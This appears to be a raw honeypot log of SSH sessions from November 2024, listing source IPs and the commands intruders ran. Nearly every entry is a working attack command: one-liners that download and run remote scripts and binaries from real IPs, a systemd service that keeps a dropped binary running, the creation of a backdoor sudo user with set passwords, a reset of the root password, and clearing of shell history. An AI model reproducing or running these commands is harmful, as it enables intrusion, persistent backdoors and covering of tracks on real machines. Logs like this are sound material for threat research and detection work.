start
2024-11-19 20:47:48.246951 - ('87.120.113.231', 35844) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
2024-11-24 02:28:11.813002 - ('45.148.10.203', 35662) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:12.112022 - ('45.148.10.203', 35668) - apt
2024-11-24 02:28:12.288401 - ('45.148.10.203', 35668) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:12.591983 - ('45.148.10.203', 35676) - apt
2024-11-24 02:28:12.768418 - ('45.148.10.203', 35676) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:13.072107 - ('45.148.10.203', 35690) - apt
2024-11-24 02:28:13.248896 - ('45.148.10.203', 35690) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:13.556162 - ('45.148.10.203', 35694) - apt
2024-11-24 02:28:13.744418 - ('45.148.10.203', 35694) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:14.047342 - ('45.148.10.203', 35698) - apt
2024-11-24 02:28:14.220752 - ('45.148.10.203', 35698) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:14.523424 - ('45.148.10.203', 35706) - apt
2024-11-24 02:28:14.700495 - ('45.148.10.203', 35706) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:15.005038 - ('45.148.10.203', 34214) - apt
2024-11-24 02:28:15.180526 - ('45.148.10.203', 34214) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:15.483906 - ('45.148.10.203', 34228) - apt
2024-11-24 02:28:15.668415 - ('45.148.10.203', 34228) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:15.972230 - ('45.148.10.203', 34244) - apt
2024-11-24 02:28:16.149287 - ('45.148.10.203', 34244) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:16.453553 - ('45.148.10.203', 34260) - apt
2024-11-24 02:28:16.632525 - ('45.148.10.203', 34260) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:16.939423 - ('45.148.10.203', 34272) - apt
2024-11-24 02:28:17.120232 - ('45.148.10.203', 34272) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:17.423548 - ('45.148.10.203', 34274) - apt
2024-11-24 02:28:17.606936 - ('45.148.10.203', 34274) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:17.919011 - ('45.148.10.203', 34276) - apt
2024-11-24 02:28:18.096327 - ('45.148.10.203', 34276) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:18.395432 - ('45.148.10.203', 34278) - apt
2024-11-24 02:28:18.580302 - ('45.148.10.203', 34278) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:18.883644 - ('45.148.10.203', 34288) - apt
2024-11-24 02:28:19.060622 - ('45.148.10.203', 34288) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:19.359515 - ('45.148.10.203', 34302) - apt
2024-11-24 02:28:19.540593 - ('45.148.10.203', 34302) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:19.843610 - ('45.148.10.203', 34314) - apt
2024-11-24 02:28:20.020582 - ('45.148.10.203', 34314) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:20.319630 - ('45.148.10.203', 34320) - apt
2024-11-24 02:28:20.502910 - ('45.148.10.203', 34320) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:20.807570 - ('45.148.10.203', 34340) - apt
2024-11-24 02:28:20.984518 - ('45.148.10.203', 34340) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:21.289071 - ('45.148.10.203', 34348) - apt
2024-11-24 02:28:21.473348 - ('45.148.10.203', 34348) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:21.910219 - ('45.148.10.203', 34364) - apt
2024-11-24 02:28:22.088722 - ('45.148.10.203', 34364) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:22.396305 - ('45.148.10.203', 34378) - apt
2024-11-24 02:28:22.573009 - ('45.148.10.203', 34378) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:22.875545 - ('45.148.10.203', 34394) - apt
2024-11-24 02:28:23.056487 - ('45.148.10.203', 34394) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:28:23.360097 - ('45.148.10.203', 34398) - apt
2024-11-24 02:28:23.536424 - ('45.148.10.203', 34398) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 03:23:38.680640 - ('82.41.185.199', 61667) - mount -o remount,rw /||sudo mount -o remount,rw /;mkdir -p /dev/shm/rondo/rondo2 /mnt/rondo/rondo2 /tmp/rondo/rondo2 /var/tmp/rondo/rondo2 rondo/rondo2;cd /tmp/rondo||cd /var/tmp/rondo||cd /dev/shm/rondo||cd /mnt/rondo||cd rondo;ls -F
2024-11-24 06:22:08.652298 - ('87.120.113.231', 43132) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-24 06:35:04.088261 - ('84.174.124.124', 60952) - scp -t -- /tmp/D0DlYt6r
2024-11-24 06:35:04.268737 - ('84.174.124.124', 60962) - scp -t -- /tmp/D0DlYt6r
2024-11-24 09:58:56.232261 - ('46.19.143.66', 56364) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 8ZHSVCTg) system && sudo usermod -aG sudo system
2024-11-24 09:58:56.517392 - ('46.19.143.66', 56364) - lscpu && echo -e "8ZHSVCTg\n8ZHSVCTg" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 11:41:54.101790 - ('31.30.172.21', 57191) - echo -e "\x6F\x6B"
2024-11-24 12:55:09.128020 - ('46.19.143.66', 40492) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 43SW5fXJ) system && sudo usermod -aG sudo system
2024-11-24 12:55:09.342177 - ('46.19.143.66', 40492) - lscpu && echo -e "43SW5fXJ\n43SW5fXJ" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 17:52:50.779792 - ('46.19.143.66', 52828) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 hBMuzFQn) system && sudo usermod -aG sudo system
2024-11-24 17:52:51.169353 - ('46.19.143.66', 52828) - lscpu && echo -e "hBMuzFQn\nhBMuzFQn" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 23:22:06.892463 - ('84.133.33.1', 55038) - wget -qO - http://61.215.136.198/x/1sh | sh > /dev/null 2>&1 &
2024-11-24 23:22:06.974542 - ('84.133.33.1', 55038) - rm -rf /var/run/1sh; wget -c http://61.215.136.198/x/1sh -P /var/run && sh /var/run/1sh &
2024-11-24 23:22:07.059181 - ('84.133.33.1', 55038) - wget -qO - http://61.215.136.198/x/2sh | sh > /dev/null 2>&1 &
2024-11-24 23:22:07.140264 - ('84.133.33.1', 55038) - rm -rf /tmp/2sh; wget -c http://61.215.136.198/x/2sh -P /tmp && sh /tmp/2sh &
2024-11-24 23:22:07.222394 - ('84.133.33.1', 55038) - curl http://61.215.136.198/x/3sh | sh
2024-11-24 23:22:07.304349 - ('84.133.33.1', 55038) - cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-24 23:22:07.386788 - ('84.133.33.1', 55038) - cd /tmp ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-24 23:22:07.468940 - ('84.133.33.1', 55038) - cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-24 23:22:07.550096 - ('84.133.33.1', 55038) - uname -a || cat /proc/version || echo -- 
2024-11-25 02:45:22.949817 - ('87.120.113.231', 46044) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-25 05:53:44.936771 - ('45.148.10.46', 36414) - apt
2024-11-25 05:53:48.950930 - ('45.148.10.46', 36414) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 05:54:36.033893 - ('45.148.10.46', 36962) - apt
2024-11-25 05:54:39.039619 - ('45.148.10.46', 36962) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 05:55:25.036322 - ('45.148.10.46', 33388) - apt
2024-11-25 05:55:29.353000 - ('45.148.10.46', 33388) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 05:55:43.980724 - ('45.148.10.46', 56504) - apt
2024-11-25 05:55:47.333585 - ('45.148.10.46', 56504) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 05:56:03.632748 - ('45.148.10.46', 42822) - apt
2024-11-25 05:56:07.340248 - ('45.148.10.46', 42822) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 05:57:28.233508 - ('45.148.10.46', 59560) - apt
2024-11-25 05:57:32.634160 - ('45.148.10.46', 59560) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 06:01:44.127099 - ('45.148.10.46', 38866) - apt
2024-11-25 06:01:47.728518 - ('45.148.10.46', 38866) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 06:02:04.530348 - ('45.148.10.46', 38250) - apt
2024-11-25 06:02:08.232205 - ('45.148.10.46', 38250) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 06:09:35.716760 - ('45.148.10.46', 48712) - apt
2024-11-25 06:09:41.018522 - ('45.148.10.46', 48712) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 06:09:59.916580 - ('45.148.10.46', 39624) - apt
2024-11-25 06:10:04.633537 - ('45.148.10.46', 39624) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 06:35:34.766042 - ('46.19.143.66', 40874) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 C5xjT5au) system && sudo usermod -aG sudo system
2024-11-25 06:35:35.015077 - ('46.19.143.66', 40874) - lscpu && echo -e "C5xjT5au\nC5xjT5au" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-25 06:46:47.030366 - ('87.120.113.231', 35350) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-25 07:30:11.748566 - ('137.184.116.114', 44070) - uname -s -m
2024-11-25 09:56:09.683141 - ('46.19.143.66', 33714) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 xYkBa5ue) system && sudo usermod -aG sudo system
2024-11-25 09:56:10.421164 - ('46.19.143.66', 33714) - lscpu && echo -e "xYkBa5ue\nxYkBa5ue" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-25 13:41:13.208007 - ('195.178.110.6', 50944) - apt
2024-11-25 13:41:17.212366 - ('195.178.110.6', 50944) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:41:25.611407 - ('195.178.110.6', 59704) - apt
2024-11-25 13:41:26.132057 - ('195.178.110.6', 59704) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:41:42.513531 - ('195.178.110.6', 33882) - apt
2024-11-25 13:41:46.811820 - ('195.178.110.6', 33882) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:42:01.307714 - ('195.178.110.6', 38410) - apt
2024-11-25 13:42:03.618043 - ('195.178.110.6', 38410) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:42:17.911553 - ('195.178.110.6', 39068) - apt
2024-11-25 13:42:20.443646 - ('195.178.110.6', 39068) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:42:35.307562 - ('195.178.110.6', 44290) - apt
2024-11-25 13:42:39.815081 - ('195.178.110.6', 44290) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:42:51.717738 - ('195.178.110.6', 58588) - apt
2024-11-25 13:42:56.728984 - ('195.178.110.6', 58588) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 13:44:13.705967 - ('195.178.110.6', 60730) - apt
2024-11-25 13:44:18.408042 - ('195.178.110.6', 60730) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-25 14:49:02.671384 - ('87.120.113.231', 35248) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-25 15:07:09.003692 - ('218.92.0.132', 51194) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-25 15:07:10.914223 - ('218.92.0.132', 51194) - ls -la /var/run/gcc.pid
2024-11-25 15:39:38.133377 - ('87.120.113.231', 40788) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

